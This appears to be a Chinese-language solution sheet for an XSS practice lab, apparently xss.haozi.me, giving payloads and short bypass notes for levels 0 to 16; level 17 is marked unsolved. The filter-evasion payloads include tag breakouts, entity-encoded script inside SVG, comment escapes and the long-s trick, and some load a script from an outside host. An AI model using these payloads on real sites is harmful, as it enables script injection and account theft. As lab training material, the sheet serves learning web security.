# xss

## 第 0 题

```javascript
<script>alert(1)<script>
```

## 第 1 题

```javascript
</textarea><script>alert(1)</script>
```

## 第 2 题

```javascript
// 也是提前结束掉
"><script>alert(1)</script>
```

## 第 3 题

```javascript
// 只过滤掉()没用
<script>alert`1`</script>

// 也可以不闭合
<script>alert`1`</script
```

## 第 4 题

```javascript
// svg 中是可以执行实体字符的
<svg><script>alert&#40;1&#41;</script

// parent 是调用父节点的 alert
<iframe srcdoc="<script>parent.alert&#40;1&#41;</script> "
<iframe srcdoc="<script>parent.alert&#40;1&#41;</script> "></iframe>
```

## 第 5 题

```javascript
// 逃离注释，两种注释都可以
<!-- --!>
<!-- -->
fdsfsd --!><script>alert(1)</script>
```

## 第 6 题

```javascript
// input 的image属性，src等于空会触发onerror，为了逃避正则使用了换行符
type=image src onerror
=alert(1)
```

## 第 7 题

```javascript
<svg onload=alert(1) /
```

## 第 8 题

```javascript
// 注意style后的空格，或者是/、换行都可以
</style ><script>alert(1)</script>
```

## 第 9 题

```javascript
https://www.baidu.com"></script><script>alert(1)//
```

## 第 10 题

```javascript
// 一个完整的url地址scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]
// url中做转义也是会被请求的
https://www.baidu.com.jd.me/j.js
https://www.segmentfault.com@xss.haozi.me/j.js
```

## 第 11 题

```javascript
// 直接写alert肯定是废掉了，但url是不区分大小写的，注意最后有个空格
<script src="https://xss.haozi.me/j.js"></script> 
```

## 第 12 题

```javascript
<scscriptript src="https://xss.haozi.me/j.js"></scscriptript>
```

## 第 13 题

```javascript
// js里面可以使用html的注释，注意第一行是空的

alert(1)
-->
```

## 第 14 题

```javascript
// ſ 是 s的另一种写法
<ſcript src="https://xss.haozi.me/j.js"></ſcript>
```

## 第 15 题

```javascript
// ; 也可以换成是逗号或换行符
');alert(1)//
```

## 第 16 题

```javascript
alert(1)

// 建议写法
try{
    window.data = JSON.parse('\bfdfd\b');
} catch(e) {
    // 数据出错兜底
    window.data = {};
}
```

## 第 17 题

```javascript
// 无解
```
